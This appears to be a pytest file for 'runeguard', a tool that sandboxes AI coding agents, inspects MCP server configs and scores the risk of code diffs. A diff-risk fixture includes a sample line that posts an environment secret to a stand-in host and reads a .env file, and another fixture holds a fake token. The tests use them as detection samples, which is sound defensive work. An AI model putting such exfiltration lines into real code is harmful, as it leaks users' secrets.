import json

from typer.testing import CliRunner

from runeguard.agent import AgentWrapConfig, validate_agent_command
from runeguard.ci import initialize_github_ci
from runeguard.cli import app
from runeguard.diff_risk import analyze_diff_text
from runeguard.mcp.inspect import inspect_mcp_config
from runeguard.policy import Policy


runner = CliRunner()


def test_agent_wrap_generic_runs_host_command(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "runeguard.yaml").write_text(
        """
version: 1
sandbox:
  backend: host
network:
  default: deny
shell:
  deny_patterns: []
files:
  deny: []
""",
        encoding="utf-8",
    )

    result = runner.invoke(
        app,
        ["agent", "wrap", "--agent", "generic", "--backend", "host", "--", "python", "-c", "print('ok')"],
    )

    assert result.exit_code == 0
    assert "Allowed actions:" in result.output
    assert (tmp_path / ".runeguard" / "audit.jsonl").exists()


def test_agent_validate_reports_missing_binary(tmp_path):
    config = AgentWrapConfig(agent="generic", command=["definitely-not-installed-runeguard-test"], workspace=tmp_path)

    try:
        validate_agent_command(config)
    except FileNotFoundError as exc:
        assert "not installed" in str(exc)
    else:
        raise AssertionError("expected missing binary")


def test_ci_init_generates_github_workflow(tmp_path):
    workflow = initialize_github_ci(tmp_path)
    text = workflow.read_text(encoding="utf-8")

    assert "runeguard/action@v1" in text
    assert "command: YOUR_AGENT_COMMAND_HERE" in text
    assert "profile: ci" in text


def test_diff_risk_detects_sensitive_changes():
    report = analyze_diff_text(
        """diff --git a/package.json b/package.json
++ b/package.json
    "left-pad": "1.0.0"
diff --git a/src/auth.py b/src/auth.py
++ b/src/auth.py
requests.post("https://x.test", data=os.environ["SECRET"])
open(".env").read()
"""
    )

    assert report.score == "high"
    assert "package.json" in report.risky_files
    assert "src/auth.py" in report.risky_files


def test_mcp_inspect_flags_env_secrets(tmp_path):
    config = tmp_path / "mcp.json"
    config.write_text(
        json.dumps({
            "mcpServers": {
                "local": {
                    "command": "npx",
                    "args": ["https://example.test/server"],
                    "env": {"API_TOKEN": "ghp_abcdefghijklmnopqrstuvwxyzABCDE"},
                }
            }
        }),
        encoding="utf-8",
    )

    servers = inspect_mcp_config(config)

    assert servers[0].name == "local"
    assert "env may include secrets" in servers[0].risks
    assert "interpreter launch" in servers[0].risks


def test_policy_supports_mcp_rules():
    policy = Policy({
        "version": 1,
        "mcp": {
            "allow_servers": ["safe"],
            "deny_servers": ["bad"],
            "deny_tools": ["read_secret"],
        },
    })

    assert policy.decide("mcp_server", server_name="safe").type.value == "ALLOW"
    assert policy.decide("mcp_server", server_name="other").type.value == "BLOCK"
    assert policy.decide("mcp_tool", server_name="safe", mcp_tool="read_secret").type.value == "BLOCK"
